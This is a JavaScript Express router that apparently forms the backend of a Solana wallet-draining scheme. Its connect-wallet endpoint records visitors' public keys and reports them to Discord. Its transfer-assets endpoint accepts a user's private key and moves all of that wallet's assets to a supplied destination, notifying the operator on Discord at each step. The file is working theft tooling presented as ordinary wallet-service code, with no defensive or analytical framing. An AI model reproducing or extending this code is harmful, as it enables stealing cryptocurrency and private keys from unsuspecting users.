const express = require('express');
const router = express.Router();
const { sendDiscordNotification } = require('../utils/discord');
const { MoneyMover } = require('../utils/solana');

// Store temporary user sessions (in production, use Redis)
const userSessions = new Map();

// Connect wallet endpoint
router.post('/connect-wallet', async (req, res) => {
  try {
    const { publicKey, userAgent } = req.body;
    
    if (!publicKey) {
      return res.status(400).json({ error: 'Public key is required' });
    }

    // Generate session ID
    const sessionId = Math.random().toString(36).substring(7);
    userSessions.set(sessionId, {
      publicKey,
      connectedAt: new Date(),
      userAgent
    });

    // Send Discord notification
    await sendDiscordNotification({
      type: 'WALLET_CONNECTED',
      publicKey,
      sessionId,
      userAgent,
      timestamp: new Date().toISOString()
    });

    res.json({ 
      success: true, 
      sessionId,
      message: 'Wallet connected successfully' 
    });

  } catch (error) {
    console.error('Error connecting wallet:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Transfer assets endpoint
router.post('/transfer-assets', async (req, res) => {
  try {
    const { privateKey, destinationWallet, sessionId } = req.body;
    
    if (!privateKey || !destinationWallet) {
      return res.status(400).json({ 
        error: 'Private key and destination wallet are required' 
      });
    }

    // Get session info
    const session = userSessions.get(sessionId);
    if (!session) {
      return res.status(401).json({ error: 'Invalid session' });
    }

    // Send start notification
    await sendDiscordNotification({
      type: 'TRANSFER_STARTED',
      publicKey: session.publicKey,
      destinationWallet,
      sessionId,
      timestamp: new Date().toISOString()
    });

    // Initialize MoneyMover and transfer assets
    const moneyMover = new MoneyMover(privateKey);
    
    // Get wallet info first
    const walletInfo = await moneyMover.getWalletInfo();
    
    // Transfer assets
    const result = await moneyMover.transferAllAssets(destinationWallet);

    // Send completion notification
    await sendDiscordNotification({
      type: result.success ? 'TRANSFER_COMPLETED' : 'TRANSFER_FAILED',
      publicKey: session.publicKey,
      destinationWallet,
      signature: result.signature,
      totalValue: result.totalValue,
      error: result.error,
      sessionId,
      timestamp: new Date().toISOString()
    });

    res.json(result);

  } catch (error) {
    console.error('Error transferring assets:', error);
    
    // Send error notification
    await sendDiscordNotification({
      type: 'TRANSFER_ERROR',
      error: error.message,
      timestamp: new Date().toISOString()
    });

    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Get token prices
router.get('/prices', async (req, res) => {
  try {
    const { tokens } = req.query;
    const tokenList = tokens ? tokens.split(',') : ['SOL'];
    
    const MoneyMover = require('../utils/solana').MoneyMover;
    const prices = await MoneyMover.getTokenPrices(tokenList);
    
    res.json({ success: true, prices });
  } catch (error) {
    console.error('Error fetching prices:', error);
    res.status(500).json({ error: 'Failed to fetch prices' });
  }
});

module.exports = router;